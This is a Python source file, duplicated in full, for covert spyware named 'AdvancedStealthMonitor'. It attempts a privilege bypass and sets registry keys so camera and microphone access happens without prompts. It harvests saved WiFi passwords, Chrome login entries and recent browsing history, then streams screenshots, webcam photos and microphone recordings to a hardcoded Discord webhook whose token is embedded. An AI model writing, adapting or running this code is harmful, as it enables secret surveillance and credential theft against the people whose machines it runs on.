import cv2
import pyautogui
import time
import os
import sqlite3
import shutil
import subprocess
from datetime import datetime, timedelta
from discord import Webhook, SyncWebhook, File
import io
import threading
import ctypes
import wave
import pyaudio
from PIL import Image

# Silent admin and privilege bypass - NO PROMPTS
def bypass_privileges():
    try:
        # Bypass UAC completely
        if not ctypes.windll.shell32.IsUserAnAdmin():
            process = ctypes.windll.kernel32.GetCurrentProcess()
            token = ctypes.c_void_p()
            ctypes.windll.advapi32.OpenProcessToken(process, 0x0020, ctypes.byref(token))
            ctypes.windll.advapi32.AdjustTokenPrivileges(token, False, 0, 0, 0, 0)
        
        # Disable all camera/mic permissions via registry
        registry_commands = [
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam', '/v', 'Value', '/t', 'REG_SZ', '/d', 'Allow', '/f'],
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone', '/v', 'Value', '/t', 'REG_SZ', '/d', 'Allow', '/f'],
        ]
        
        for cmd in registry_commands:
            try:
                subprocess.run(cmd, capture_output=True, shell=True, timeout=2)
            except:
                pass
                
    except:
        pass

# Execute bypass immediately
bypass_privileges()

class AdvancedStealthMonitor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.webhook = SyncWebhook.from_url(webhook_url)
        self.running = True
        self.session_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.audio = None
        self.initialize_audio()
        print("✅ All privileges bypassed - Complete stealth mode")
        
    def initialize_audio(self):
        """Initialize audio system with error handling"""
        try:
            self.audio = pyaudio.PyAudio()
        except Exception as e:
            print(f"⚠️ Audio system unavailable: {e}")
            self.audio = None
    
    def capture_screenshot(self):
        """Capture screenshot"""
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            return img_bytes
        except:
            return None
    
    def capture_webcam_photo(self):
        """Capture webcam photo instead of video - MORE RELIABLE"""
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if cap.isOpened():
                cap.set(cv2.CAP_PROP_SETTINGS, 0)
                ret, frame = cap.read()
                if ret and frame is not None:
                    # Convert BGR to RGB
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(frame_rgb)
                    
                    # Convert to bytes
                    img_bytes = io.BytesIO()
                    img_pil.save(img_bytes, format='JPEG', quality=90)
                    img_bytes.seek(0)
                    
                    cap.release()
                    return img_bytes
            cap.release()
            return None
        except Exception as e:
            return None
    
    def record_microphone(self, duration=30):
        """Record microphone audio with error handling"""
        if not self.audio:
            return None
            
        try:
            # Audio settings
            chunk = 1024
            sample_format = pyaudio.paInt16
            channels = 1
            rate = 16000
            
            filename = f"mic_{self.session_id}.wav"
            
            # Start recording
            stream = self.audio.open(
                format=sample_format,
                channels=channels,
                rate=rate,
                frames_per_buffer=chunk,
                input=True
            )
            
            frames = []
            print(f"🎤 Recording {duration} seconds of audio...")
            
            for i in range(0, int(rate / chunk * duration)):
                if not self.running:
                    break
                try:
                    data = stream.read(chunk, exception_on_overflow=False)
                    frames.append(data)
                except:
                    break
            
            # Stop recording
            stream.stop_stream()
            stream.close()
            
            # Save to WAV file
            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(self.audio.get_sample_size(sample_format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Read and return
            with open(filename, 'rb') as f:
                audio_bytes = io.BytesIO(f.read())
            audio_bytes.seek(0)
            os.remove(filename)
            
            print("✅ Audio recording completed")
            return audio_bytes
            
        except Exception as e:
            print(f"Microphone error: {e}")
            return None
    
    def extract_wifi_passwords(self):
        """Extract ALL saved WiFi passwords - FIXED VERSION"""
        try:
            wifi_passwords = []
            
            print("📡 Running WiFi password extraction...")
            
            # Get all WiFi profiles using different command approaches
            try:
                # Method 1: netsh command
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, shell=True)
                
                if result.returncode != 0:
                    # Method 2: Alternative command
                    result = subprocess.run('netsh wlan show profiles', capture_output=True, text=True, shell=True)
                
                # Extract profile names
                profiles = []
                for line in result.stdout.split('\n'):
                    if "All User Profile" in line or "Profil Tous les utilisateurs" in line:
                        parts = line.split(":")
                        if len(parts) > 1:
                            profile_name = parts[1].strip()
                            if profile_name:
                                profiles.append(profile_name)
                
                print(f"📡 Found {len(profiles)} WiFi profiles: {profiles}")
                
                for profile in profiles:
                    try:
                        # Get password for each profile
                        cmd = f'netsh wlan show profile "{profile}" key=clear'
                        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
                        
                        # Extract password
                        password = None
                        for line in result.stdout.split('\n'):
                            if "Key Content" in line or "Contenu de la clé" in line:
                                parts = line.split(":")
                                if len(parts) > 1:
                                    password = parts[1].strip()
                                    break
                        
                        if password:
                            wifi_passwords.append({
                                'ssid': profile,
                                'password': password
                            })
                            print(f"✅ Extracted password for: {profile}")
                        else:
                            print(f"❌ No password found for: {profile}")
                            
                    except Exception as e:
                        print(f"⚠️ Error extracting {profile}: {e}")
                        continue
                
            except Exception as e:
                print(f"❌ WiFi extraction failed: {e}")
            
            return wifi_passwords
            
        except Exception as e:
            print(f"❌ WiFi extraction error: {e}")
            return []
    
    def extract_chrome_passwords(self):
        """Extract ALL saved passwords from Chrome"""
        try:
            passwords = []
            
            # Chrome password locations
            chrome_paths = [
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data'
            ]
            
            for chrome_path in chrome_paths:
                full_path = os.path.expanduser(chrome_path)
                if os.path.exists(full_path):
                    try:
                        temp_db = f"temp_chrome_{len(passwords)}.db"
                        shutil.copy2(full_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for row in cursor.fetchall():
                            url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            
                            if url and username:
                                passwords.append({
                                    'url': url,
                                    'username': username,
                                    'password': 'ENCRYPTED - Requires Master Key',
                                    'profile': os.path.basename(os.path.dirname(full_path))
                                })
                        
                        conn.close()
                        if os.path.exists(temp_db):
                            os.remove(temp_db)
                            
                    except Exception as e:
                        continue
            
            return passwords
            
        except Exception as e:
            return []
    
    def extract_last_24h_google_history(self):
        """Extract ONLY last 24 hours of Google Chrome history"""
        try:
            last_24h_history = []
            twenty_four_hours_ago = datetime.now() - timedelta(hours=24)
            
            # Convert to Chrome timestamp (microseconds since 1601)
            chrome_time_cutoff = (twenty_four_hours_ago - datetime(1601, 1, 1)).total_seconds() * 1000000
            
            # Chrome history locations
            chrome_paths = [
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\History'
            ]
            
            for chrome_path in chrome_paths:
                full_path = os.path.expanduser(chrome_path)
                if os.path.exists(full_path):
                    try:
                        temp_db = f"temp_history_{len(last_24h_history)}.db"
                        shutil.copy2(full_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Get only last 24 hours history
                        cursor.execute("""
                            SELECT url, title, last_visit_time, visit_count 
                            FROM urls 
                            WHERE last_visit_time > ?
                            ORDER BY last_visit_time DESC
                        """, (chrome_time_cutoff,))
                        
                        profile_history = []
                        for row in cursor.fetchall():
                            try:
                                visit_time = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
                                profile_history.append({
                                    'url': row[0],
                                    'title': row[1] or 'No Title',
                                    'last_visited': visit_time.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_count': row[3],
                                    'profile': os.path.basename(os.path.dirname(full_path))
                                })
                            except:
                                continue
                        
                        last_24h_history.extend(profile_history)
                        
                        conn.close()
                        if os.path.exists(temp_db):
                            os.remove(temp_db)
                            
                    except Exception as e:
                        continue
            
            return last_24h_history
            
        except Exception as e:
            print(f"History extraction error: {e}")
            return []
    
    def extract_all_data_once(self):
        """Extract ALL data once at startup"""
        print("🔄 Extracting ALL data once at startup...")
        
        # Extract and send WiFi passwords FIRST
        print("📡 Extracting WiFi passwords...")
        wifi_passwords = self.extract_wifi_passwords()
        if wifi_passwords:
            wifi_text = f"📡 **SAVED WIFI PASSWORDS ({len(wifi_passwords)})**\n```"
            for wifi in wifi_passwords:
                wifi_text += f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n{'-'*40}\n"
            wifi_text += "```"
            self.send_to_discord(wifi_text)
            print(f"✅ Sent {len(wifi_passwords)} WiFi passwords")
        else:
            self.send_to_discord("📡 **WIFI PASSWORDS**\nNo saved WiFi passwords found or extraction failed.")
            print("❌ No WiFi passwords found")
        
        # Extract and send Chrome passwords
        print("🔑 Extracting Chrome passwords...")
        chrome_passwords = self.extract_chrome_passwords()
        if chrome_passwords:
            password_text = f"🔑 **CHROME PASSWORDS ({len(chrome_passwords)})**\n```"
            for pwd in chrome_passwords[:50]:  # First 50 passwords
                password_text += f"URL: {pwd['url']}\nUser: {pwd['username']}\nProfile: {pwd['profile']}\n{'-'*50}\n"
            password_text += "```"
            self.send_to_discord(password_text)
            print(f"✅ Sent {len(chrome_passwords)} Chrome passwords")
        
        # Extract and send last 24 hours Google history
        print("🌐 Extracting last 24 hours Google history...")
        last_24h_history = self.extract_last_24h_google_history()
        if last_24h_history:
            history_text = f"🌐 **LAST 24 HOURS GOOGLE HISTORY ({len(last_24h_history)} sites)**\n```"
            for entry in last_24h_history:
                history_text += f"[{entry['last_visited']}] {entry['url']}\n"
            history_text += "```"
            self.send_to_discord(history_text)
            print(f"✅ Sent last 24 hours Google history ({len(last_24h_history)} sites)")
        else:
            self.send_to_discord("🌐 **LAST 24 HOURS GOOGLE HISTORY**\nNo browsing history found in the last 24 hours.")
            print("✅ No browsing history in last 24 hours")
        
        print("✅ ALL data extraction completed!")
    
    def send_to_discord(self, content=None, files=None):
        """Send message to Discord webhook"""
        try:
            if files:
                self.webhook.send(content=content, files=files, wait=True)
            else:
                if content and len(content) > 2000:
                    chunks = [content[i:i+2000] for i in range(0, len(content), 2000)]
                    for chunk in chunks:
                        self.webhook.send(content=chunk, wait=True)
                        time.sleep(0.5)
                else:
                    self.webhook.send(content=content, wait=True)
            time.sleep(1)
        except Exception as e:
            print(f"Discord send error: {e}")
    
    def screenshot_loop(self):
        """Send screenshots every 3 seconds"""
        screenshot_count = 0
        while self.running:
            try:
                screenshot = self.capture_screenshot()
                if screenshot:
                    self.send_to_discord(
                        content=f"📸 **Screenshot #{screenshot_count}** - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(screenshot, filename=f"screen_{screenshot_count}.png")]
                    )
                    screenshot_count += 1
                    print(f"✅ Screenshot #{screenshot_count} sent")
                time.sleep(3)
            except:
                time.sleep(3)
    
    def webcam_loop(self):
        """Send webcam photos every 30 seconds (REPLACED VIDEO)"""
        webcam_count = 0
        while self.running:
            try:
                webcam_photo = self.capture_webcam_photo()
                if webcam_photo:
                    self.send_to_discord(
                        content=f"📷 **Webcam Photo #{webcam_count}** - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(webcam_photo, filename=f"webcam_{webcam_count}.jpg")]
                    )
                    webcam_count += 1
                    print(f"📷 Webcam photo #{webcam_count} sent")
                time.sleep(30)  # Every 30 seconds
            except:
                time.sleep(30)
    
    def microphone_loop(self):
        """Send 30-second audio recordings every 90 seconds"""
        if not self.audio:
            print("⚠️ Microphone disabled - audio system unavailable")
            return
            
        audio_count = 0
        while self.running:
            try:
                audio_data = self.record_microphone(duration=30)
                if audio_data:
                    self.send_to_discord(
                        content=f"🎤 **Microphone Recording #{audio_count}** (30s) - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(audio_data, filename=f"audio_30s_{audio_count}.wav")]
                    )
                    audio_count += 1
                    print(f"🎤 Audio recording #{audio_count} sent")
                time.sleep(90)
            except:
                time.sleep(90)
    
    def start_monitoring(self):
        """Start all monitoring loops"""
        # Send startup message
        self.send_to_discord(
            f"🚀 **ADVANCED STEALTH MONITOR STARTED**\n"
            f"Session: {self.session_id}\n"
            f"📸 Screenshots: Every 3s\n"
            f"📷 Webcam: Photos every 30s\n"
            f"🎤 Microphone: 30s recordings every 90s\n"
            f"📡 WiFi Passwords: Extracted\n"
            f"🔑 Chrome Passwords: Extracted\n"
            f"🌐 Last 24 Hours Google History: Extracted\n"
            f"🔒 Complete stealth - No prompts"
        )
        
        # Extract ALL data ONCE at startup
        self.extract_all_data_once()
        
        # Start continuous monitoring threads
        threads = [
            threading.Thread(target=self.screenshot_loop),
            threading.Thread(target=self.webcam_loop),
            threading.Thread(target=self.microphone_loop),
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        print("✅ Advanced stealth monitoring started!")
        print("📸 Screenshots every 3 seconds")
        print("📷 Webcam photos every 30 seconds")
        print("🎤 30-second microphone recordings every 90 seconds")
        print("📡 WiFi passwords extracted")
        print("🔑 Chrome passwords extracted") 
        print("🌐 Last 24 hours Google history extracted")
        print("🔒 Running in complete stealth mode")
        print("⏹️  Press Ctrl+C to stop")
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.running = False
        if self.audio:
            self.audio.terminate()
        self.send_to_discord(f"🛑 **MONITORING STOPPED**\nSession: {self.session_id}")

# Main execution
def main():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1429943760422178876/XUXkHRlYb8XduZHM-2-QcZ08Oyu6MDQVyRmI5uHrIoyTsPAHdpL_rV7hdugsZKq0ee1I"
    
    print("🚀 Starting Advanced Stealth Monitor...")
    print("🔧 Bypassing all permissions silently...")
    
    monitor = AdvancedStealthMonitor(WEBHOOK_URL)
    monitor.start_monitoring()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping monitor...")
        monitor.stop_monitoring()

if __name__ == "__main__":
    main()import cv2
import pyautogui
import time
import os
import sqlite3
import shutil
import subprocess
from datetime import datetime, timedelta
from discord import Webhook, SyncWebhook, File
import io
import threading
import ctypes
import wave
import pyaudio
from PIL import Image

# Silent admin and privilege bypass - NO PROMPTS
def bypass_privileges():
    try:
        # Bypass UAC completely
        if not ctypes.windll.shell32.IsUserAnAdmin():
            process = ctypes.windll.kernel32.GetCurrentProcess()
            token = ctypes.c_void_p()
            ctypes.windll.advapi32.OpenProcessToken(process, 0x0020, ctypes.byref(token))
            ctypes.windll.advapi32.AdjustTokenPrivileges(token, False, 0, 0, 0, 0)
        
        # Disable all camera/mic permissions via registry
        registry_commands = [
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam', '/v', 'Value', '/t', 'REG_SZ', '/d', 'Allow', '/f'],
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone', '/v', 'Value', '/t', 'REG_SZ', '/d', 'Allow', '/f'],
        ]
        
        for cmd in registry_commands:
            try:
                subprocess.run(cmd, capture_output=True, shell=True, timeout=2)
            except:
                pass
                
    except:
        pass

# Execute bypass immediately
bypass_privileges()

class AdvancedStealthMonitor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.webhook = SyncWebhook.from_url(webhook_url)
        self.running = True
        self.session_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.audio = None
        self.initialize_audio()
        print("✅ All privileges bypassed - Complete stealth mode")
        
    def initialize_audio(self):
        """Initialize audio system with error handling"""
        try:
            self.audio = pyaudio.PyAudio()
        except Exception as e:
            print(f"⚠️ Audio system unavailable: {e}")
            self.audio = None
    
    def capture_screenshot(self):
        """Capture screenshot"""
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            return img_bytes
        except:
            return None
    
    def capture_webcam_photo(self):
        """Capture webcam photo instead of video - MORE RELIABLE"""
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if cap.isOpened():
                cap.set(cv2.CAP_PROP_SETTINGS, 0)
                ret, frame = cap.read()
                if ret and frame is not None:
                    # Convert BGR to RGB
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(frame_rgb)
                    
                    # Convert to bytes
                    img_bytes = io.BytesIO()
                    img_pil.save(img_bytes, format='JPEG', quality=90)
                    img_bytes.seek(0)
                    
                    cap.release()
                    return img_bytes
            cap.release()
            return None
        except Exception as e:
            return None
    
    def record_microphone(self, duration=30):
        """Record microphone audio with error handling"""
        if not self.audio:
            return None
            
        try:
            # Audio settings
            chunk = 1024
            sample_format = pyaudio.paInt16
            channels = 1
            rate = 16000
            
            filename = f"mic_{self.session_id}.wav"
            
            # Start recording
            stream = self.audio.open(
                format=sample_format,
                channels=channels,
                rate=rate,
                frames_per_buffer=chunk,
                input=True
            )
            
            frames = []
            print(f"🎤 Recording {duration} seconds of audio...")
            
            for i in range(0, int(rate / chunk * duration)):
                if not self.running:
                    break
                try:
                    data = stream.read(chunk, exception_on_overflow=False)
                    frames.append(data)
                except:
                    break
            
            # Stop recording
            stream.stop_stream()
            stream.close()
            
            # Save to WAV file
            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(self.audio.get_sample_size(sample_format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Read and return
            with open(filename, 'rb') as f:
                audio_bytes = io.BytesIO(f.read())
            audio_bytes.seek(0)
            os.remove(filename)
            
            print("✅ Audio recording completed")
            return audio_bytes
            
        except Exception as e:
            print(f"Microphone error: {e}")
            return None
    
    def extract_wifi_passwords(self):
        """Extract ALL saved WiFi passwords - FIXED VERSION"""
        try:
            wifi_passwords = []
            
            print("📡 Running WiFi password extraction...")
            
            # Get all WiFi profiles using different command approaches
            try:
                # Method 1: netsh command
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, shell=True)
                
                if result.returncode != 0:
                    # Method 2: Alternative command
                    result = subprocess.run('netsh wlan show profiles', capture_output=True, text=True, shell=True)
                
                # Extract profile names
                profiles = []
                for line in result.stdout.split('\n'):
                    if "All User Profile" in line or "Profil Tous les utilisateurs" in line:
                        parts = line.split(":")
                        if len(parts) > 1:
                            profile_name = parts[1].strip()
                            if profile_name:
                                profiles.append(profile_name)
                
                print(f"📡 Found {len(profiles)} WiFi profiles: {profiles}")
                
                for profile in profiles:
                    try:
                        # Get password for each profile
                        cmd = f'netsh wlan show profile "{profile}" key=clear'
                        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
                        
                        # Extract password
                        password = None
                        for line in result.stdout.split('\n'):
                            if "Key Content" in line or "Contenu de la clé" in line:
                                parts = line.split(":")
                                if len(parts) > 1:
                                    password = parts[1].strip()
                                    break
                        
                        if password:
                            wifi_passwords.append({
                                'ssid': profile,
                                'password': password
                            })
                            print(f"✅ Extracted password for: {profile}")
                        else:
                            print(f"❌ No password found for: {profile}")
                            
                    except Exception as e:
                        print(f"⚠️ Error extracting {profile}: {e}")
                        continue
                
            except Exception as e:
                print(f"❌ WiFi extraction failed: {e}")
            
            return wifi_passwords
            
        except Exception as e:
            print(f"❌ WiFi extraction error: {e}")
            return []
    
    def extract_chrome_passwords(self):
        """Extract ALL saved passwords from Chrome"""
        try:
            passwords = []
            
            # Chrome password locations
            chrome_paths = [
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data'
            ]
            
            for chrome_path in chrome_paths:
                full_path = os.path.expanduser(chrome_path)
                if os.path.exists(full_path):
                    try:
                        temp_db = f"temp_chrome_{len(passwords)}.db"
                        shutil.copy2(full_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for row in cursor.fetchall():
                            url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            
                            if url and username:
                                passwords.append({
                                    'url': url,
                                    'username': username,
                                    'password': 'ENCRYPTED - Requires Master Key',
                                    'profile': os.path.basename(os.path.dirname(full_path))
                                })
                        
                        conn.close()
                        if os.path.exists(temp_db):
                            os.remove(temp_db)
                            
                    except Exception as e:
                        continue
            
            return passwords
            
        except Exception as e:
            return []
    
    def extract_last_24h_google_history(self):
        """Extract ONLY last 24 hours of Google Chrome history"""
        try:
            last_24h_history = []
            twenty_four_hours_ago = datetime.now() - timedelta(hours=24)
            
            # Convert to Chrome timestamp (microseconds since 1601)
            chrome_time_cutoff = (twenty_four_hours_ago - datetime(1601, 1, 1)).total_seconds() * 1000000
            
            # Chrome history locations
            chrome_paths = [
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History',
                '~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\History'
            ]
            
            for chrome_path in chrome_paths:
                full_path = os.path.expanduser(chrome_path)
                if os.path.exists(full_path):
                    try:
                        temp_db = f"temp_history_{len(last_24h_history)}.db"
                        shutil.copy2(full_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Get only last 24 hours history
                        cursor.execute("""
                            SELECT url, title, last_visit_time, visit_count 
                            FROM urls 
                            WHERE last_visit_time > ?
                            ORDER BY last_visit_time DESC
                        """, (chrome_time_cutoff,))
                        
                        profile_history = []
                        for row in cursor.fetchall():
                            try:
                                visit_time = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
                                profile_history.append({
                                    'url': row[0],
                                    'title': row[1] or 'No Title',
                                    'last_visited': visit_time.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_count': row[3],
                                    'profile': os.path.basename(os.path.dirname(full_path))
                                })
                            except:
                                continue
                        
                        last_24h_history.extend(profile_history)
                        
                        conn.close()
                        if os.path.exists(temp_db):
                            os.remove(temp_db)
                            
                    except Exception as e:
                        continue
            
            return last_24h_history
            
        except Exception as e:
            print(f"History extraction error: {e}")
            return []
    
    def extract_all_data_once(self):
        """Extract ALL data once at startup"""
        print("🔄 Extracting ALL data once at startup...")
        
        # Extract and send WiFi passwords FIRST
        print("📡 Extracting WiFi passwords...")
        wifi_passwords = self.extract_wifi_passwords()
        if wifi_passwords:
            wifi_text = f"📡 **SAVED WIFI PASSWORDS ({len(wifi_passwords)})**\n```"
            for wifi in wifi_passwords:
                wifi_text += f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n{'-'*40}\n"
            wifi_text += "```"
            self.send_to_discord(wifi_text)
            print(f"✅ Sent {len(wifi_passwords)} WiFi passwords")
        else:
            self.send_to_discord("📡 **WIFI PASSWORDS**\nNo saved WiFi passwords found or extraction failed.")
            print("❌ No WiFi passwords found")
        
        # Extract and send Chrome passwords
        print("🔑 Extracting Chrome passwords...")
        chrome_passwords = self.extract_chrome_passwords()
        if chrome_passwords:
            password_text = f"🔑 **CHROME PASSWORDS ({len(chrome_passwords)})**\n```"
            for pwd in chrome_passwords[:50]:  # First 50 passwords
                password_text += f"URL: {pwd['url']}\nUser: {pwd['username']}\nProfile: {pwd['profile']}\n{'-'*50}\n"
            password_text += "```"
            self.send_to_discord(password_text)
            print(f"✅ Sent {len(chrome_passwords)} Chrome passwords")
        
        # Extract and send last 24 hours Google history
        print("🌐 Extracting last 24 hours Google history...")
        last_24h_history = self.extract_last_24h_google_history()
        if last_24h_history:
            history_text = f"🌐 **LAST 24 HOURS GOOGLE HISTORY ({len(last_24h_history)} sites)**\n```"
            for entry in last_24h_history:
                history_text += f"[{entry['last_visited']}] {entry['url']}\n"
            history_text += "```"
            self.send_to_discord(history_text)
            print(f"✅ Sent last 24 hours Google history ({len(last_24h_history)} sites)")
        else:
            self.send_to_discord("🌐 **LAST 24 HOURS GOOGLE HISTORY**\nNo browsing history found in the last 24 hours.")
            print("✅ No browsing history in last 24 hours")
        
        print("✅ ALL data extraction completed!")
    
    def send_to_discord(self, content=None, files=None):
        """Send message to Discord webhook"""
        try:
            if files:
                self.webhook.send(content=content, files=files, wait=True)
            else:
                if content and len(content) > 2000:
                    chunks = [content[i:i+2000] for i in range(0, len(content), 2000)]
                    for chunk in chunks:
                        self.webhook.send(content=chunk, wait=True)
                        time.sleep(0.5)
                else:
                    self.webhook.send(content=content, wait=True)
            time.sleep(1)
        except Exception as e:
            print(f"Discord send error: {e}")
    
    def screenshot_loop(self):
        """Send screenshots every 3 seconds"""
        screenshot_count = 0
        while self.running:
            try:
                screenshot = self.capture_screenshot()
                if screenshot:
                    self.send_to_discord(
                        content=f"📸 **Screenshot #{screenshot_count}** - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(screenshot, filename=f"screen_{screenshot_count}.png")]
                    )
                    screenshot_count += 1
                    print(f"✅ Screenshot #{screenshot_count} sent")
                time.sleep(3)
            except:
                time.sleep(3)
    
    def webcam_loop(self):
        """Send webcam photos every 30 seconds (REPLACED VIDEO)"""
        webcam_count = 0
        while self.running:
            try:
                webcam_photo = self.capture_webcam_photo()
                if webcam_photo:
                    self.send_to_discord(
                        content=f"📷 **Webcam Photo #{webcam_count}** - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(webcam_photo, filename=f"webcam_{webcam_count}.jpg")]
                    )
                    webcam_count += 1
                    print(f"📷 Webcam photo #{webcam_count} sent")
                time.sleep(30)  # Every 30 seconds
            except:
                time.sleep(30)
    
    def microphone_loop(self):
        """Send 30-second audio recordings every 90 seconds"""
        if not self.audio:
            print("⚠️ Microphone disabled - audio system unavailable")
            return
            
        audio_count = 0
        while self.running:
            try:
                audio_data = self.record_microphone(duration=30)
                if audio_data:
                    self.send_to_discord(
                        content=f"🎤 **Microphone Recording #{audio_count}** (30s) - {datetime.now().strftime('%H:%M:%S')}",
                        files=[File(audio_data, filename=f"audio_30s_{audio_count}.wav")]
                    )
                    audio_count += 1
                    print(f"🎤 Audio recording #{audio_count} sent")
                time.sleep(90)
            except:
                time.sleep(90)
    
    def start_monitoring(self):
        """Start all monitoring loops"""
        # Send startup message
        self.send_to_discord(
            f"🚀 **ADVANCED STEALTH MONITOR STARTED**\n"
            f"Session: {self.session_id}\n"
            f"📸 Screenshots: Every 3s\n"
            f"📷 Webcam: Photos every 30s\n"
            f"🎤 Microphone: 30s recordings every 90s\n"
            f"📡 WiFi Passwords: Extracted\n"
            f"🔑 Chrome Passwords: Extracted\n"
            f"🌐 Last 24 Hours Google History: Extracted\n"
            f"🔒 Complete stealth - No prompts"
        )
        
        # Extract ALL data ONCE at startup
        self.extract_all_data_once()
        
        # Start continuous monitoring threads
        threads = [
            threading.Thread(target=self.screenshot_loop),
            threading.Thread(target=self.webcam_loop),
            threading.Thread(target=self.microphone_loop),
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        print("✅ Advanced stealth monitoring started!")
        print("📸 Screenshots every 3 seconds")
        print("📷 Webcam photos every 30 seconds")
        print("🎤 30-second microphone recordings every 90 seconds")
        print("📡 WiFi passwords extracted")
        print("🔑 Chrome passwords extracted") 
        print("🌐 Last 24 hours Google history extracted")
        print("🔒 Running in complete stealth mode")
        print("⏹️  Press Ctrl+C to stop")
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.running = False
        if self.audio:
            self.audio.terminate()
        self.send_to_discord(f"🛑 **MONITORING STOPPED**\nSession: {self.session_id}")

# Main execution
def main():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1429943760422178876/XUXkHRlYb8XduZHM-2-QcZ08Oyu6MDQVyRmI5uHrIoyTsPAHdpL_rV7hdugsZKq0ee1I"
    
    print("🚀 Starting Advanced Stealth Monitor...")
    print("🔧 Bypassing all permissions silently...")
    
    monitor = AdvancedStealthMonitor(WEBHOOK_URL)
    monitor.start_monitoring()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping monitor...")
        monitor.stop_monitoring()

if __name__ == "__main__":
    main()
